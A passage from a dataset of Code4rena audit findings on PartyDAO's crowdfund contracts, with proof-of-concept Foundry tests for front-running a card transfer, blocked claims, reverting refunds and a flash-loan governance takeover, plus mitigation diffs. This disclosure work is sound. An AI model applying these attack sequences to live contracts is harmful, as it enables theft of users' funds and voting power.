      "content": "\nIn this report I show how an attacker can abuse the fact that anyone can call [`ReraiseETHCrowdfund.claim`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303) for any user and add voting power to an existing party card.\n\nThe result can be a griefing attack whereby the victim loses voting power. In some cases the attacker can take advantage himself.\n\nIn short this is what needs to happen:\n\n1.  The victim sends a transaction to transfer one of his party cards\n2.  The transaction is front-run and pending voting power of the victim from the `ReraiseETHCrowdfund` contract is claimed to this party card that is transferred\n3.  The victim thereby loses the pending voting power\n\nThe fact that any user is at risk that has pending voting power and transfers a party card and that voting power is arguably the most important asset in the protocol makes me estimate this to be \"High\" severity.\n\n### Proof of Concept\n\nWe start by observing that when the `ReraiseETHCrowdfund` is won, any user can call `ReraiseETHCrowdfund.claim` for any other user and either mint a new party card to him or add the pending voting power to an existing party card:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303)\n\n```solidity\n/// @notice Claim a party card for a contributor if the crowdfund won. Can be called\n///         to claim for self or on another's behalf.\n/// @param tokenId The ID of the party card to add voting power to. If 0, a\n///                new card will be minted.\n/// @param contributor The contributor to claim for.\nfunction claim(uint256 tokenId, address contributor) public {\n    // Check crowdfund lifecycle.\n    {\n        CrowdfundLifecycle lc = getCrowdfundLifecycle();\n        if (lc != CrowdfundLifecycle.Finalized) {\n            revert WrongLifecycleError(lc);\n        }\n    }\n\n\n    uint96 votingPower = pendingVotingPower[contributor];\n\n\n    if (votingPower == 0) return;\n\n\n    {\n        uint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n        uint96 maxContribution_ = maxContribution;\n        // Check that the contribution equivalent of total pending voting\n        // power is not above the max contribution range. This can happen\n        // for contributors who contributed multiple times In this case, the\n        // `claimMultiple` function should be called instead. This is done\n        // so parties may use the minimum and maximum contribution values to\n        // limit the voting power of each card (e.g.  a party desiring a \"1\n        // card = 1 vote\"-like governance system where each card has equal\n        // voting power).\n        if (contribution > maxContribution_) {\n            revert AboveMaximumContributionsError(contribution, maxContribution_);\n        }\n    }\n\n\n    // Burn the crowdfund NFT.\n    _burn(contributor);\n\n\n    delete pendingVotingPower[contributor];\n\n\n    if (tokenId == 0) {\n        // Mint contributor a new party card.\n        tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);\n    } else if (disableContributingForExistingCard) {\n        revert ContributingForExistingCardDisabledError();\n    } else if (party.ownerOf(tokenId) == contributor) {\n        // Increase voting power of contributor's existing party card.\n        party.addVotingPower(tokenId, votingPower);\n    } else {\n        revert NotOwnerError();\n    }\n\n\n    emit Claimed(contributor, tokenId, votingPower);\n}\n```\n\nNote that the caller can specify any `contributor` and can add the pending votes to an existing party card if `!disableContributingForExistingCard && party.ownerOf(tokenId) == contributor`.\n\nSo if User A has pending voting power and transfers one of his party cards to User B, then User C might front-run this transfer and claim the pending voting power to the party card that is transferred.\n\nIf User B performs this attack it is not a griefing attack since User B benefits from it.\n\nNote that at the time of sending the transfer transaction the `ReraiseETHCrowdfund` does not have to be won already. The transaction that does the front-running might contribute to the crowdfund such that it is won and then claim the pending voting power.\n\nAdd the following test to the `ReraiseETHCrowdfund.t.sol` test file. It shows how an attacker would perform such an attack:\n\n```solidity\nfunction test_FrontRunTransfer() public {\n    ReraiseETHCrowdfund crowdfund = _createCrowdfund({\n        initialContribution: 0,\n        initialContributor: payable(address(0)),\n        initialDelegate: address(0),\n        minContributions: 0,\n        maxContributions: type(uint96).max,\n        disableContributingForExistingCard: false,\n        minTotalContributions: 2 ether,\n        maxTotalContributions: 3 ether,\n        duration: 7 days,\n        fundingSplitBps: 0,\n        fundingSplitRecipient: payable(address(0))\n    });\n\n    address attacker = _randomAddress();\n    address victim = _randomAddress();\n    vm.deal(victim, 2.5 ether);\n    vm.deal(attacker, 0.5 ether);\n\n    // @audit-info the victim owns a party card\n    vm.prank(address(party));\n    party.addAuthority(address(this));\n    party.increaseTotalVotingPower(1 ether);\n    uint256 victimTokenId = party.mint(victim, 1 ether, address(0));\n\n\n    vm.startPrank(victim);\n    crowdfund.contribute{ value: 2.5 ether }(victim, \"\");\n    vm.stopPrank();\n\n    /* @audit-info\n    The victim wants to transfer the party card, say to the attacker, and the attacker\n    front-runs this by completing the crowdfund and claiming the victim's pending voting\n    power to the existing party card\n    */\n\n    vm.startPrank(attacker);\n    crowdfund.contribute{ value: 0.5 ether }(attacker, \"\");\n    crowdfund.claim(victimTokenId,victim);\n    vm.stopPrank();\n\n    /* @audit-info\n    when the victim's transfer is executed, he transfers also all of the voting power\n    that was previously his pending voting power (effectively losing it)\n    */\n    vm.prank(victim);\n    party.tranferFrom(victim,attacker,victimTokenId);\n}\n```\n\nSo when there is an ongoing crowdfund it is never safe to transfer one's party card. It can always result in a complete loss of the pending voting power.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIn the `ReraiseETHCrowdfund.claim` function it should not be possible to add the pending voting power to an existing party card. It is possible though to allow it for the `contributor` himself but not for any user.\n\n```diff\ndiff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol\nindex 580623d..cb560e1 100644\n--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol\n+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol\n@@ -292,7 +292,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n             tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);\n         } else if (disableContributingForExistingCard) {\n             revert ContributingForExistingCardDisabledError();\n-        } else if (party.ownerOf(tokenId) == contributor) {\n+        } else if (party.ownerOf(tokenId) == contributor && contributor == msg.sender) {\n             // Increase voting power of contributor's existing party card.\n             party.addVotingPower(tokenId, votingPower);\n         } else {\n```\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/12#issuecomment-1515465156):**\n > Good finding, still thinking about the mitigation.\n> \n> Slightly hesitant to make the only action when claiming for someone else to be minting them a new card although minting to their existing card might be a rare action because of the friction involved in having to get the ID of one of the person's cards first. Someone minting for someone else might just find it more convenient to mint them a new card, so having that be the only action might not be much of a loss.\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-04-party-findings/issues/12#issuecomment-1532054697):**\n > We've decided to refactor the way claiming works in the `ReraiseETHCrowdfund`, partially because a large number of findings like this being submitted around that one area that highlighted for us the need to rework its logic.\n> \n> The change will make it so (1) crowdfund NFTs are minted per contribution instead of per address and (2) claiming works more like a 1:1 conversion of your crowdfund NFT into a party card instead of how it works now. In the future we will also add the ability to split/merge party cards.\n> \n> This should mitigate this finding because in this new system you cannot decide to add the voting power from a crowdfund NFT to an existing party card when claiming, only mint a new party card.\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes how an attacker can abuse the fact that anyone can call [`ReraiseETHCrowdfund.claim`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303) for any user and add voting power to an existing party card. This can result in a griefing attack whereby the victim loses voting power. It can also be used by the attacker to take advantage of the victim. \n\nThe attack works by the victim sending a transaction to transfer one of his party cards. This transaction is then front-run and pending voting power of the victim from the `ReraiseETHCrowdfund` contract is claimed to this party card that is transferred. The victim thereby loses the pending voting power.\n\nTo demonstrate this, a test was added to the `ReraiseETHCrowdfund.t.sol` test file. This test shows how an attacker would perform such an attack.\n\nThe recommended mitigation step is to make it so that in the `ReraiseETHCrowdfund.claim` function it is not possible to add the pending voting power to an existing party card, except for the contributor himself. This was confirmed and commented on by 0xble (Party). The team then decided to refactor the way claiming works in the `ReraiseETHCrowdfund` so that crowdfund NFTs are minted per contribution instead of per address, and claiming works more like a 1:1 conversion of crowdfund NFT into a party card instead of how it works now. This should mitigate this finding as in the new system, one cannot decide to add the voting power from a crowdfund NFT to an existing party card when claiming, only mint a new party card.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/12",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "19983",
      "title": "[H-04] `ReraiseETHCrowdfund.sol`: Multiple scenarios how pending votes might not be claimable which is a complete loss of funds for a user",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L256-L303>\n\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L333-L382>\n\nThis issue is about how the [`ReraiseETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol) claim functionality can be broken.\n\nWhen the claim functionality is broken this means that a user cannot claim his voting power, resulting in a complete loss of funds.\n\nThe claim functionality is not broken in any case, i.e. with any configuration of the `ReraiseETHCrowdfund` contract.\n\nHowever the contract can be configured in a way - and by configured I mean specifically the `minContribution`, `maxContribution`, `minTotalContributions` and `maxTotalContributions` variables - that the claim functionality breaks.\n\nAnd the configurations under which it breaks are NOT edge cases. They represent the **intended use** of the contract as discussed with the sponsor.\n\nThe fact that when the contract is used as intended it can lead to a complete loss of funds for the users makes me estimate this to be \"High\" severity.\n\n### Proof of Concept\n\nWe first need to understand the `claim(uint256 tokenId, address contributor)` and `claimMultiple(uint96[] memory votingPowerByCard, address contributor)` functions. They essentially make up the claim functionality as all other functions regarding claiming are just wrappers around them.\n\nLet's first look at the `claim(uint256 tokenId, address contributor)` function. The first part of the function is what we are interested in:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L256-L283)\n\n```solidity\nfunction claim(uint256 tokenId, address contributor) public {\n    // Check crowdfund lifecycle.\n    {\n        CrowdfundLifecycle lc = getCrowdfundLifecycle();\n        if (lc != CrowdfundLifecycle.Finalized) {\n            revert WrongLifecycleError(lc);\n        }\n    }\n\n\n    uint96 votingPower = pendingVotingPower[contributor];\n\n\n    if (votingPower == 0) return;\n\n\n    {\n        uint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n        uint96 maxContribution_ = maxContribution;\n        // Check that the contribution equivalent of total pending voting\n        // power is not above the max contribution range. This can happen\n        // for contributors who contributed multiple times In this case, the\n        // `claimMultiple` function should be called instead. This is done\n        // so parties may use the minimum and maximum contribution values to\n        // limit the voting power of each card (e.g.  a party desiring a \"1\n        // card = 1 vote\"-like governance system where each card has equal\n        // voting power).\n        if (contribution > maxContribution_) {\n            revert AboveMaximumContributionsError(contribution, maxContribution_);\n        }\n    }\n```\n\nWhat is important is that `contribution` is calculatesd as:\n\n```solidity\nuint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n```\n\nAnd then `contribution` is checked that it is `<= maxContribution`:\n\n```solidity\nif (contribution > maxContribution_) {\n    revert AboveMaximumContributionsError(contribution, maxContribution_);\n}\n```\n\nThe explanation for why this check is necessary can be seen in the comment:\n\n```text\n// This is done\n// so parties may use the minimum and maximum contribution values to\n// limit the voting power of each card (e.g.  a party desiring a \"1\n// card = 1 vote\"-like governance system where each card has equal\n// voting power).\n```\n\nThe `claimMultiple(uint96[] memory votingPowerByCard, address contributor)` function allows to divide the pending voting power across multiple party cards and it employs the following checks:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L352-L382)\n\n```solidity\n    uint96 minContribution_ = minContribution;\n    uint96 maxContribution_ = maxContribution;\n    for (uint256 i; i < votingPowerByCard.length; ++i) {\n        if (votingPowerByCard[i] == 0) continue;\n\n\n        // Check that the contribution equivalent of voting power is within\n        // contribution range. This is done so parties may use the minimum\n        // and maximum contribution values to limit the voting power of each\n        // card (e.g. a party desiring a \"1 card = 1 vote\"-like governance\n        // system where each card has equal voting power).\n        uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;\n        if (contribution < minContribution_) {\n            revert BelowMinimumContributionsError(contribution, minContribution_);\n        }\n\n\n        if (contribution > maxContribution_) {\n            revert AboveMaximumContributionsError(contribution, maxContribution_);\n        }\n\n\n        votingPower -= votingPowerByCard[i];\n\n\n        // Mint contributor a new party card.\n        uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate);\n\n\n        emit Claimed(contributor, tokenId, votingPowerByCard[i]);\n    }\n\n\n    // Requires that all voting power is claimed because the contributor is\n    // expected to have burned their crowdfund NFT.\n    if (votingPower != 0) revert RemainingVotingPowerAfterClaimError(votingPower);\n}\n```\n\nWe can see that for each party card the `contribution` needs to be `>= minContribution` and `<= maxContribution`. Also the function must deal with all the voting power, so after the function call all pending voting power must be processed:\n\n```solidity\nif (votingPower != 0) revert RemainingVotingPowerAfterClaimError(votingPower);\n```\n\nNow we are in a position to look at a simple scenario how a user can end up without being able to claim his pending voting power (Note that this can also be a griefing attack whereby an attacker contributes for the victim some possibly small amount thereby making it impossible for the victim to claim):\n\n(The test should be added to the `ReraiseETHCrowdfund.t.sol` test file)\n\n```solidity\nfunction test_cannotClaim1() public {\n        ReraiseETHCrowdfund crowdfund = _createCrowdfund({\n            initialContribution: 0,\n            initialContributor: payable(address(0)),\n            initialDelegate: address(0),\n            minContributions: 0.9 ether,\n            maxContributions: 1 ether,\n            disableContributingForExistingCard: false,\n            minTotalContributions: 1 ether,\n            maxTotalContributions: 1.5 ether,\n            duration: 7 days,\n            fundingSplitBps: 0,\n            fundingSplitRecipient: payable(address(0))\n        });\n\n        address member = _randomAddress();\n        vm.deal(member, 2 ether);\n\n        // Contribute\n        vm.startPrank(member);\n        crowdfund.contribute{ value: 1 ether }(member, \"\");\n        crowdfund.contribute{ value: 1 ether }(member, \"\");\n        vm.stopPrank();\n\n        assertEq(crowdfund.pendingVotingPower(member), 1.5 ether);\n\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                ETHCrowdfundBase.AboveMaximumContributionsError.selector,\n                1500000000000000000,\n                1000000000000000000\n            )\n        );\n        crowdfund.claim(member);\n    }\n```\n\nIn this test the following values were chosen for the important variables that I mentioned above:\n\n    minContribution = 0.9e18\n    maxContribution = 1e18\n\n    minTotalContributions = 1e18\n    maxTotalContributions = 1.5e18\n\nWhat happens in the test is that first `1 ETH` is contributed then another `0.5 ETH` is contributed (It says `1 ETH` but `maxTotalContributions` is hit and so only `0.5 ETH` is contributed and the crowdfund is finalized).\n\nThe call to the `claim` function fails because `contribution = 1.5 ETH` which is above `maxContribution`.\n\nThe important thing is now to understand that `claimMultiple` can also not be called (therefore the pending voting power cannot be claimed at all).\n\nWhen we call `claimMultiple` the contribution for the first party card must be in the range `[0.9e18, 1e18]` to succeed and therefore the second contribution can only be in the range of `[0.5e18,0.6e18]` which is below `minContribution` and therefore it is not possible to distribute the voting power across cards such that the call succeeds.\n\nWhat we discussed so far could be mitigated by introducing some simple checks when setting up the crowdfund. The sort of checks required are like \"`minTotalContributions` must be divisible by `minContribution`\". I won't go into this deeply however because these checks are insufficient when we introduce a funding fee.\n\nLet's consider a case with:\n\n    minContribution = 1e18\n    maxContribution = 1e18\n    minTotalContributions = 2e18\n    maxTotalContributions = 2e18\n\n(Note that setting up the crowdfund with `minContribution==maxContribution` is an important use case where the party wants to enforce a \"1 card = 1 vote\"-policy).\n\nThere should be no way how this scenario causes a problem right? The contribution of a user can only be `1e18` or `2e18` and in both cases the checks in the claim functions should pass. - No\n\nIt breaks when we introduce a fee. Say there is a 1% fee (`fundingSplitBps=100`).\n\nThe contribution is calculated as (as we know from above):\n\n(Also note that `exchangeRateBps=1e4` for all tests, i.e. the exchange rate between ETH and votes is 1:1)\n\n```solidity\nuint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n```\n\nThe problem is that `votingPower` has been reduced by 1% due to the funding fee. So when a user initially contributes `1e18`, the `contribution` here is calculated to be `0.99e18 * 1e4 / 1e4 = 0.99e18` which is below `minContribution` and claiming is not possible.\n\nLet's make a final observation: The parameters can also be such that due to rounding a similar thing happens:\n\n    minContribution = 1e18 + 1 Wei\n    maxContribution = 1e18 + 1 Wei\n    minTotalContributions = 2e18 + 2 Wei\n    maxTotalContributions = 2e18 + 2 Wei\n\nDue to rounding (when calculating the funding fee or when there is not a 1:1 exchange rate) the 1 Wei in the contribution can be lost (or some other small amount) and thereby when calling `claim`, the `contribution` which has been rounded down is below `minContribution` and the claim fails.\n\nTo summarize we have seen 3 scenarios. It is not possible for me to provide an overview of all the things that can go wrong. There are just too many variables. I come back to this point in my recommendation.\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nA part of the fix is straightforward. However this is not a full fix.\n\nI recommend to implement a functionality for claiming that cannot be blocked. I know that this may cause the \"1 card = 1 vote\"-policy to be violated and it may also cause `minContribution` or `maxContribution` to be violated. But maybe this is the price to pay to ensure that users can always claim.\n\nAn alternative solution may be to reduce the range of possible configurations of the crowdfund drastically such that it can be mathematically proven that users are always able to claim.\n\nThat being said there is an obvious flaw in the current code that has been confirmed by the sponsor.\n\nThe `contribution` amount that is calculated when claiming needs to add back the funding fee amount. I.e. if there was a 1% funding fee, the `contribution` amount should be `1e18` instead of `0.99e18`.\n\nPartial fix:\n\n```diff\ndiff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol\nindex 580623d..0b1ba9e 100644\n--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol\n+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol\n@@ -268,6 +268,13 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n \n         {\n             uint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n+\n+            address payable fundingSplitRecipient_ = fundingSplitRecipient;\n+            uint16 fundingSplitBps_ = fundingSplitBps;\n+            if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n+                contribution = (contribution * 1e4) / (1e4 - fundingSplitBps_);\n+            }\n+\n             uint96 maxContribution_ = maxContribution;\n             // Check that the contribution equivalent of total pending voting\n             // power is not above the max contribution range. This can happen\n@@ -360,6 +367,13 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n             // card (e.g. a party desiring a \"1 card = 1 vote\"-like governance\n             // system where each card has equal voting power).\n             uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;\n+\n+            address payable fundingSplitRecipient_ = fundingSplitRecipient;\n+            uint16 fundingSplitBps_ = fundingSplitBps;\n+            if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n+                contribution = (contribution * 1e4) / (1e4 - fundingSplitBps_);\n+            }\n+\n             if (contribution < minContribution_) {\n                 revert BelowMinimumContributionsError(contribution, minContribution_);\n             }\n```\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-04-party-findings/issues/13#issuecomment-1526174262):**\n > Additional to the partial fix recommended in the mitigation, this will be mitigated by [preventing the case where `minContribution` may be bypassed for the last contributor when the remaining contribution is less than the minimum](https://github.com/code-423n4/2023-04-party-findings/issues/37#issuecomment-1526104629).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a problem with the claim functionality in the [`ReraiseETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol) contract. When the claim functionality is broken, a user cannot claim their voting power, resulting in a complete loss of funds. The bug can be triggered when the contract is configured with specific variables such as `minContribution`, `maxContribution`, `minTotalContributions` and `maxTotalContributions`. \n\nThe bug can be demonstrated with a proof of concept, where a user contributes 1 ETH and then another 0.5 ETH, resulting in a total contribution of 1.5 ETH. The call to the `claim` function fails because `contribution = 1.5 ETH` which is above `maxContribution`. Furthermore, the `claimMultiple` function also fails due to the same checks.\n\nThe bug can also be triggered when introducing a fee, or when rounding errors occur. To prevent this issue, it is recommended to implement a functionality for claiming that cannot be blocked, or to reduce the range of possible configurations of the crowdfund drastically such that it can be mathematically proven that users are always able to claim. Additionally, the `contribution` amount should add back the funding fee amount when calculating the contribution. Finally, the bug will be mitigated by preventing the case where `minContribution` may be bypassed for the last contributor when the remaining contribution is less than the minimum.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/13",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "evan",
        "hansfriese"
      ]
    },
    {
      "id": "19982",
      "title": "[H-03] Users wouldn't refund from the lost ETH crowdfunds due to the lack of ETH",
      "impact": "HIGH",
      "content": "\nAfter the ETH crowdfunds are lost, contributors wouldn't refund their funds because the crowdfunds contract doesn't have enough ETH balance.\n\n### Proof of Concept\n\nThe core flaw is `_calculateRefundAmount()` might return more refund amount than the original contribution amount.\n\n```solidity\n    function _calculateRefundAmount(uint96 votingPower) internal view returns (uint96 amount) {\n        amount = (votingPower * 1e4) / exchangeRateBps;\n\n        // Add back fee to contribution amount if applicable.\n        address payable fundingSplitRecipient_ = fundingSplitRecipient;\n        uint16 fundingSplitBps_ = fundingSplitBps;\n        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n            amount = (amount * 1e4) / (1e4 - fundingSplitBps_); //@audit might be greater than original contribution\n        }\n    }\n```\n\nWhen users contribute to the ETH crowdfunds, it subtracts the fee from the contribution amount.\n\n```solidity\nFile: 2023-04-party\\contracts\\crowdfund\\ETHCrowdfundBase.sol\n226:         uint16 fundingSplitBps_ = fundingSplitBps;\n227:         if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n228:             uint96 feeAmount = (amount * fundingSplitBps_) / 1e4;\n229:             amount -= feeAmount;\n230:         }\n```\n\nDuring the calculation, it calculates `feeAmount` first which is rounded down and subtracts from the contribution amount. It means the final amount after subtracting the fee would be rounded up.\n\nSo when we calculate the original amount using `_calculateRefundAmount()`, we might get a greater value.\n\nThis shows the detailed example and POC.\n\n1.  Let's assume `fundingSplitBps = 1e3(10%), exchangeRateBps = 1e4`.\n2.  A user contributed `1e18 - 1` wei of ETH. After subtracting the fee, the voting power was `1e18 - 1 - (1e18 - 1) / 10 = 9 * 1e17`\n3.  Let's assume there are no other contributors and the crowdfund was lost.\n4.  When the user calls `refund()`, the refund amount will be `9 * 1e17 * 1e4 / 9000 = 1e18` in `_calculateRefundAmount()`\n5.  So it will try to transfer 1e18 wei of ETH from the crowdfund contract that contains 1e18 - 1 wei only. As a result, the transfer will revert and the user can't refund his funds.\n\n```solidity\n    function test_refund_reverts() public {\n        InitialETHCrowdfund crowdfund = _createCrowdfund({\n            initialContribution: 0,\n            initialContributor: payable(address(0)),\n            initialDelegate: address(0),\n            minContributions: 0,\n            maxContributions: type(uint96).max,\n            disableContributingForExistingCard: false,\n            minTotalContributions: 3 ether,\n            maxTotalContributions: 5 ether,\n            duration: 7 days,\n            fundingSplitBps: 1000, //10% fee\n            fundingSplitRecipient: payable(_randomAddress()) //recipient exists\n        });\n        Party party = crowdfund.party();\n\n        uint256 ethAmount = 1 ether - 1; //contribute amount\n\n        address member = _randomAddress();\n        vm.deal(member, ethAmount);\n\n        // Contribute\n        vm.prank(member);\n        crowdfund.contribute{ value: ethAmount }(member, \"\");\n        assertEq(address(member).balance, 0);\n        assertEq(address(crowdfund).balance, ethAmount); //crowdfund's balance = 1 ether - 1\n\n        skip(7 days);\n\n        assertTrue(crowdfund.getCrowdfundLifecycle() == ETHCrowdfundBase.CrowdfundLifecycle.Lost);\n\n        // Claim refund\n        vm.prank(member);\n        uint256 tokenId = 1;\n        crowdfund.refund(tokenId); //reverts as it tried to withdraw 1 ether\n    }\n```\n\n### Recommended Mitigation Steps\n\nWhen we subtract the fee in [\\_processContribution()](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L227), we should calculate the final amount using `1e4 - fundingSplitBps` directly. Then there will be 2 rounds down in `_processContribution()` and `_calculateRefundAmount` and the refund amount won't be greater than the original amount.\n\n```solidity\n    if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n        amount = (amount * (1e4 - fundingSplitBps_)) / 1e4;\n    }\n```\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/15#issuecomment-1515456122)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the ETH crowdfunds contract which prevents contributors from refunding their funds when the crowdfunds are lost. This is because the crowdfunds contract does not have enough ETH balance to cover the amount refunded. \n\nThe core flaw is in the `_calculateRefundAmount()` function, which might return a refund amount that is greater than the original contribution amount. This is because when users contribute to the ETH crowdfunds, the fee is subtracted from the contribution amount. However, this fee is rounded down and subtracted from the contribution amount. This means that the final amount after subtracting the fee would be rounded up. \n\nWhen the user calls `refund()`, the refund amount will be calculated using the `_calculateRefundAmount()` function. This means that the refund amount might be greater than the original contribution amount, resulting in a transfer that will revert and the user unable to refund their funds. \n\nThe recommended mitigation steps to address this bug is to calculate the final amount using `1e4 - fundingSplitBps` directly when subtracting the fee in `_processContribution()`. This will ensure that there are two rounds down in `_processContribution()` and `_calculateRefundAmount` and the refund amount will not be greater than the original amount. \n\nThis bug has been confirmed by 0xble (Party).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/15",
      "tags": [],
      "finders": [
        "evan",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "19981",
      "title": "[H-02] An attacker can contribute to the ETH crowdfund using a flash loan and control the party as he likes",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273>\n\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L470>\n\nAn attacker can have more than half of the total voting power using a flash loan and abuse other contributors.\n\n### Proof of Concept\n\nThe main flaw is that the party can distribute funds right after the crowdfund is finalized within the same block.\n\nSo the attacker can contribute using a flash loan and repay by distributing the part's ETH.\n\n1.  Let's assume `maxContribution = type(uint96).max, minTotalContributions = 10 ether, maxTotalContributions = 20 ether, fundingSplitBps = 0`.\n2.  An attacker contributes 1 ether(attacker's fund) to the crowdfund and another user contributes 9 ether.\n3.  The attacker knows the crowdfund will be finalized as it satisfies the `minTotalContributions` already but he will have 10% of the total voting power.\n4.  So he decides to contribute 10 ether using a flash loan.\n5.  In `ETHCrowdfundBase._processContribution()`, the crowdfund will be finalized immediately as [total contribution is greater than maxTotalContributions](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L212).\n6.  Then the attacker will have `(1 + 10) / 20 = 55%` voting power of the party and he can pass any proposal.\n7.  So he calls `distribute()` with 19 ether. `distribute()` can be called directly if `opts.distributionsRequireVote == false`, otherwise, he should create/execute the distribution proposal and he can do it within the same block.\n8.  After that, he can receive ETH using `TokenDistributor.claim()` and the amount will be `19 * 55% = 10.45 ether`. (We ignore the distribution fee for simplicity)\n9.  He repays 10 ether to the flash loan provider and he can control the party as he likes now.\n\nThis attack is possible for both `InitialETHCrowdfund` and `ReraiseETHCrowdfund`.\n\n### Recommended Mitigation Steps\n\nI think we should implement a kind of `cooldown logic` after the crowdfund is finalized.\n\n1.  Add a `partyStartedTime` in `PartyGovernance.sol`.\n2.  While finalizing the ETH crowdfund in `ETHCrowdfundBase._finalize()`, we set `party.partyStartedTime = block.timestamp`.\n3.  After that, `PartyGovernance.distribute()` can work only when `block.timestamp > partyStartTime`.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1509327981):**\n > Coded POC would have been welcomed here due to the number of steps in the attack, will review further. \n\n**[hansfriese commented](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1509442839):**\n > Hello @0xean - Here is a POC. It should be appended to `InitialETHCrowdfund.t.sol`\n> \n> ```solidity\n> function test_finalizeUsingFlashloan() public {\n>         InitialETHCrowdfund crowdfund = _createCrowdfund({\n>             initialContribution: 0,\n>             initialContributor: payable(address(0)),\n>             initialDelegate: address(0),\n>             minContributions: 0,\n>             maxContributions: type(uint96).max,\n>             disableContributingForExistingCard: false,\n>             minTotalContributions: 10 ether,\n>             maxTotalContributions: 20 ether,\n>             duration: 7 days,\n>             fundingSplitBps: 0,\n>             fundingSplitRecipient: payable(address(0))\n>         });\n> \n>         TokenDistributor distributor = new TokenDistributor(globals, 0);\n>         globals.setAddress(LibGlobals.GLOBAL_TOKEN_DISTRIBUTOR, address(distributor));\n> \n>         Party party = crowdfund.party();\n> \n>         // Attacker has 1 ether now\n>         address attacker = _randomAddress();\n>         vm.deal(attacker, 1 ether);\n> \n>         // An honest member has 9 ether\n>         address member = _randomAddress();\n>         vm.deal(member, 9 ether);\n> \n>         // Contribute\n>         vm.prank(attacker);\n>         uint256 vp1 = crowdfund.contribute{ value: 1 ether }(attacker, \"\");\n> \n>         